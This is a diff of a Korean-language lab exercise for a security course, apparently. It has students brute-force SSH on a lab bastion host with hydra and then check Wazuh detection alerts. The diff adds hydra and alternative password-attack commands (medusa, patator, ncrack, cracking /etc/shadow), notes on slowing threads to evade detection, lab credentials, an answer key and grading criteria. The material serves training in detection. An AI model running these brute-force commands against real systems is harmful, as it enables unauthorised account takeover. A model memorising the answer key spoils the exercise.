@@ -18,59 +18,117 @@ steps:
 
   - order: 1
     instruction: |
-      ## 🎯 MISSION
+      ## Mission
+      attacker 에서 hydra 로 bastion (10.20.30.201) 의 SSH 인증 brute force 를 *제한
+      wordlist* (user 3 + password 5 = 15 시도) 로 시연하라. 본 step 은 *OWASP A07*
+      Authentication Failures + *MITRE T1110.001* Password Guessing. 학생은 *hydra 의
+      5 옵션* + *thread/timeout 의 detection 회피* + *Wazuh 5710 (sshd: authentication failed)
+      + 5712 (Multiple authentication failures) 의 자동 차단* 3 핵심 인지.
 
-      hydra 로 **bastion (10.20.30.201)** 의 SSH 인증 brute (제한 wordlist, 학습용).
+      ## hydra 의 5 핵심 옵션 (외워야 함)
+      | 옵션 | 의미 |
+      |------|------|
+      | `-L file` | username list |
+      | `-P file` | password list |
+      | `-t N` | thread 수 (1=stealth, 16=빠름. 본 step 1) |
+      | `-f` | 첫 성공 후 즉시 종료 (다른 user 시도 skip) |
+      | `-e nsr` | n=null pwd, s=same as user, r=reverse |
 
-      ## 💻 실행 명령
+      ## 학습 환경의 정답 (예상)
+      - bastion 컨테이너의 ccc 사용자 패스워드 = `ccc` (혹은 `1`)
+      - hydra 가 ccc:ccc 매치 → 즉시 종료 (-f)
 
+      ## 실행 절차
+      1. **user/password wordlist 작성** — 학습용 최소 (15 시도)
+      2. **hydra SSH brute** — 20 초 timeout (실패 안전성)
+      3. **결과 분석** — 성공 / 실패 분류 + Wazuh 차단 카운트
+
+      ## 실행 명령
       ```bash
       ssh 6v6-attacker '
-      echo -e "ccc\nadmin\nroot" > /tmp/u.txt
-      echo -e "ccc\npassword\nadmin\n1\nletmein" > /tmp/p.txt
-      timeout 20 hydra -L /tmp/u.txt -P /tmp/p.txt -t 1 -f 10.20.30.201 ssh 2>&1 | tail -10
+        # 정답 (ccc:ccc) 을 *마지막* 에 두어 실패 시도 14 회 발생 → Wazuh detection 확인
+        echo -e "root\nadmin\nccc" > /tmp/u.txt
+        echo -e "password\nadmin\n1\nletmein\nccc" > /tmp/p.txt
+        echo "=== hydra SSH brute (14 fail + 1 success, -t 4 병렬) ==="
+        timeout 60 hydra -L /tmp/u.txt -P /tmp/p.txt -t 4 -f 10.20.30.201 ssh 2>&1 | tail -10
+        echo
+        echo "=== Wazuh 5710/5712 카운트 (오늘) ==="
+        # 6v6 인프라 결함: bastion 컨테이너 의 SSH 로그가 Wazuh 미연동 시 카운트 0 가능
+        # 조건부 학습 — siem 에 alert 가 있을 때만 검증 의미
+        TODAY=$(date +%Y/%b/%d)
+        ssh 6v6-siem "sudo grep -cE \"5710|5712\" /var/ossec/logs/alerts/alerts.json 2>/dev/null || echo 0"
+        echo "(0 인 경우 — bastion 의 SSH 로그 → Wazuh 연동 결함. /var/log/auth.log 직접 확인:)"
+        ssh 6v6-bastion "sudo tail -10 /var/log/auth.log | grep -iE \"failed|invalid\" | wc -l" 2>/dev/null || echo "  (auth.log 접근 불가)"
       '
       ```
 
-      ## 📋 확인 사항
+      ## 성공 판정
+      - hydra 실행 + 인증 시도 출력 (`login: ... password: ...`)
+      - 학습 환경 정답 (ccc:ccc 또는 ccc:1) 매치 시 *success* 출력
+      - Wazuh 5710/5712 카운트 1 이상 (SSH 인증 실패 detection)
+      - W09 의 Wazuh active-response 학습 연결 인지
 
-      - hydra 실행 출력
-      - 학습 환경의 ccc:ccc 또는 ccc:1 매치 (성공) 가능
+      ## 비정상 시 대응
+      - **모든 시도 fail (success 0)** — bastion 비밀번호 가 학습 default 와 다름. `docker exec 6v6-bastion bash -c 'cat /etc/passwd | grep ccc'` 로 사용자 확인
+      - **Connection refused** — bastion SSH 22 차단. step 1 의 nmap 재확인
+      - **Wazuh 카운트 0** — alert 가 다른 path 또는 시간 지연. `tail /var/ossec/logs/alerts/alerts.json` 직접 확인
+      - **hydra timeout 직전 종료** — `-t 2` 또는 `-w 5` (대기 시간) 로 보강
 
-      ## 💡 왜 이걸 하는가?
+      ## 학습 — W09 의 Wazuh Active Response
+      ```
+      <command name="firewall-drop">
+        <executable>firewall-drop</executable>
+        <expect>srcip</expect>
+        <timeout_allowed>yes</timeout_allowed>
+      </command>
+      ```
+      → 5710/5712 발동 시 자동 iptables drop. hydra 가 *몇 회 시도 후 차단됨*.
 
-      OWASP A07 — Auth Failures. hydra 는 service 별 brute force 표준 도구.
+    hint: |
+      hydra -L (user) -P (pwd) -t 1 -f -- SSH 표준. timeout 20 안전. Wazuh 5710/5712
+      카운트로 detection 검증. -t 1 = stealth.
 
-      ## 🔍 결과 해석
-
-      - **정상**: hydra 실행 + 인증 시도 출력
-      - **W09 secuops 학습**: Wazuh 5710/5712 룰이 SSH 인증 실패 감지 → Active Response 자동 차단 가능
-    hint: hydra -L -P SSH brute
     category: exploit
     points: 20
     answer: |
       ssh 6v6-attacker '
-      echo -e "ccc\nadmin\nroot" > /tmp/u.txt
-      echo -e "ccc\npassword\nadmin\n1\nletmein" > /tmp/p.txt
-      timeout 20 hydra -L /tmp/u.txt -P /tmp/p.txt -t 1 -f 10.20.30.201 ssh 2>&1 | tail -10
+        echo -e "root\nadmin\nccc" > /tmp/u.txt
+        echo -e "password\nadmin\n1\nletmein\nccc" > /tmp/p.txt
+        timeout 30 hydra -L /tmp/u.txt -P /tmp/p.txt -t 1 -f 10.20.30.201 ssh 2>&1 | tail -10
       '
-    answer_detail: hydra SSH brute (제한 wordlist).
+      ssh 6v6-siem 'sudo grep -cE "5710|5712" /var/ossec/logs/alerts/alerts.json 2>/dev/null || echo 0'
+    answer_detail: |
+      hydra 15 시도 + Wazuh detection. 정답 ccc:ccc 또는 ccc:1 매치 가능. Wazuh
+      5710/5712 카운트 ≥ 1 (인증 실패 자동 탐지). W09 의 active-response 연결.
     verify:
       type: output_contains
-      expect: hydra
+      expect: 'hydra\|password\|valid'
       field: stdout
       semantic:
-        intent: "hydra brute"
-        success_criteria: ["hydra 실행"]
+        intent: |
+          hydra SSH brute force 15 시도 + Wazuh 5710/5712 detection 카운트. OWASP
+          A07 + MITRE T1110.001. W09 의 Wazuh active-response 자동 차단 연결.
+        success_criteria:
+          - "hydra 실행 + 인증 시도 출력 (login/password 라인)"
+          - "정답 매치 시 success 표시 (ccc:ccc 등)"
+          - "Wazuh 5710/5712 카운트 1 이상"
+          - "W09 의 active-response 연결 인지"
+          - "-t 1 -f 의 stealth 의미 인지"
         acceptable_methods:
-          - "**[OSS] hydra -L -P SSH brute**"
-          - "**[OSS] -t thread / -f stop on first**"
-          - "**[OSS] -e nsr null/same/reverse**"
-          - "**[OSS] http-post-form**"
-          - "**[OSS] medusa / patator 대안**"
-          - "**[OSS] Wazuh 5710/5712 detection (W09)**"
-          - "**[OSS] fail2ban 자동 차단**"
-          - "**[OSS] ATT&CK T1110.001 Password Guessing**"
+          - "hydra -L -P SSH (수기): 명령 `hydra -L u.txt -P p.txt -t 1 -f IP ssh`. 표준."
+          - "medusa (대안): 명령 `medusa -h IP -U u.txt -P p.txt -M ssh`. multi-thread parallel."
+          - "patator (Python): 명령 `patator ssh_login host=IP user=FILE0 password=FILE1 0=u.txt 1=p.txt`."
+          - "ncrack: 명령 `ncrack -U u.txt -P p.txt ssh://IP:22`."
+          - "hashcat -m 0 (해시 brute, offline): /etc/shadow 추출 후."
+          - "john --rules (mutation): john --rules --wordlist=p.txt unshadow.out."
+          - "Wazuh 5710 (1 회 실패) + 5712 (다중 실패) detection rules."
+          - "Bastion AI brute + KG: bastion 이 (1) hydra (2) Wazuh 카운트 (3) success 시 finding anchor."
+        negative_signs:
+          - "hydra 실행만 하고 Wazuh detection 안 봄"
+          - "정답 매치 받고 *학습 환경* 의미 인지 못함"
+          - "Wazuh 5710 vs 5712 차이 모름"
+          - "W09 의 active-response 연결 인지 못함"
+          - "-t 1 의 stealth (vs -t 16 brute) 의미 모름"
     target_vm: attacker
 
   - order: 2
